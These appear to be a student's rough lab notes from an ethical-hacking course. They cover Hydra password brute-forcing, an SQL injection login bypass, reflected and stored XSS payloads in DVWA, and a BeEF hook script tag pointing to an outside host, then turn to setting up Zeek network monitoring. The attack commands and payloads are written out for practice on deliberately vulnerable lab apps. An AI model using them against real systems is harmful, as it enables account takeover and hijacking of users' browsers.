1) Hydra Brute force--------------

mysql -u root = 

show databases =

use owasp10  = 


select * from accounts;   =  all entries in table account 
(showsm userid and password shows hash ids)

logged =(check username and password works ,type userdi and password)

log out again

do , brute force, use hydra tool ,and apply that
(takes a list of words , create a list of words then apply it ) 

type crunch inn kali = creates a words list ,  
man = manual of crunch , 

crunch 6 8 abc123 -o wordlist.txt = pass length 6 ,password creation
do ls to see

how to we use wordlist by hydra 
put manually password - adminpass

vi wordlist.txt 
i
put the password



applying 
hydra = list of commands how to use it

hydra -l user -P passlist.txt ftp://192.168.0.1   = website ip copy
copy it and paste it 

hydra 192.168.0.1 -l admin -P wordlist.txt

access this website 
type id and pass 

open burp suit ,ON it - temporary project , next,start
go to browser tyupe proxy, burp suit is on , use manual  ,entry ip and port 127.0.01 .pott mo enter 
go to brup suit ,go to proxy,intecept is off,do intercept on, go browser, go to login page type userid and pass
it will top ,see brup suit intercept you can see 

brup suit is in middle ,man in middle , 
you can modify ,see posty request 
broweser is stopped,

click forward in burp suit 
reuest is on proxy ,now click forward it , it will forward it on server 
logged out again





now using hydra, keep intercept off,

use this string , this string is input to hydra tool = what it does is - hydra 172.0.0.172 -l admin -P wordlist.txt http-post-form "/mutillidae/index.php?page=login.php:username-"password=^user^&password

 admin wordlist in directory , what is the type of service we are attacking mentioned in post request , 

ON the intercept

F and S :failed to login or failed , until you see this sting keep on trying
3 part , using the string list ,trying and error

contrut the string, copy string , go to terminal,run the string om kali, it is trying all possible, 
result = successful message
shows user id and password

check any http website... 


logout

2) SQL injection ------------------

insert own sql - keep admin fixed , 
type admin
pass

error -- ehe has entry  : " verbebos
type - admin 
type - password - manual type verberbos `

error screen -  what can we use-- diagonse  select * from accounts , username and password

foes it sql intercreter 
is getting response 

make statement true by adding OR and 1  = 
like this = select * from acc where username='admin' AND password=pass' OR 1=1#


use comment to ' -- put OR 1=1# to comment it out 




using more exploit

toggle security to level 1 
try with security level 1 - type again username and password 
its not working- not detecting the ' - why -  secutiy technique used - special chaercter not allowed
try with bru[ suit - 

req intercept password change = 

how to bypass the request - the input is valid 
change the password - go in inspector paste it, encoded 
forward it,input through the brup proxy

moreofn this 



3) cross  site request forging scripting---------------------------------------

javascript 
high risk..
malicious
mobj = injectmy query 

type 1 -persistent  xss========================


wil get session id 

myspace appl 
javascripty runs o scerver backend


type 2 - reflected xss================================


practical-------------------


===1)

go into DVWA security ,make it low,go into xss reflected,name = ----
goes to server and come back
---level 0 - nothing validation 

<script>alert("hai")</script>


---- level1-- some validation--- bcoz not working
change in to pre tag 

bypassing the filter 

finf the way to bypass the filter mechanism

go to xss stored
try sign 


hai
message = <script>alert("ssdsddssds")</script>

in database 




-------------------tool beef-------------------

sudo beef-xss


copy script tag

payload === make it 
replace the ip 
<script src="hhtp://??172.163:3000hook.js"></script>

tag is hoocked on browser

lisy of command
go to explits ==see able to push the alerts ----  actreate a alert alert test excrute it -- pushing the stuff on the website- 

ot raw javascript


spyder
sypder eye-  screenshot
hooked.js file is in beef ,





task - try shell access, and sql injection in own account

===================================================================================================



note - if install thru source code L  do nano /usr/local/zeek/etc/node.cfg
zeek ---- monitoring tool 








ip link show = show configuration

vi /opt/zeek/etc/node.cfg = find your network interface                                    -inet open sockets 

add af_packets as prefix (good practice) command----(interface=af_packet::enp0s7)

after configuration file ,deploy the zeek it will start monitoribng behind the screen 
command ---- zeekctl deploy

step 3 :verify zeek
 
--- zeek

logs-------

ls /opt/zeek/logs/current ===       from many of them   conn log is most imp log file

ls /opt/zeek/logs = current log fiule with date

zeekctl status 
zeekctl netstats
zeekctl capstats
zeekctl stop -- stops the zeek
zeekctl start -- start the zeek 
dont need to deploy again and again

compressed and saved 
ls -l = shows the files are created

log filed - timestamp , ..

less /opt/zeek/logsw/current/conn.log

to see logs -sol is 
zeek-cut -m -d ts uid id.orig_h id.orig_p id_resp_h id.resp_p proto < conn.log

or use pipe to see the columns to specify

nslookup 224.0.0.251
or
ping google 


=======scripting========


zeek_init  - initial constructor 


create a file name
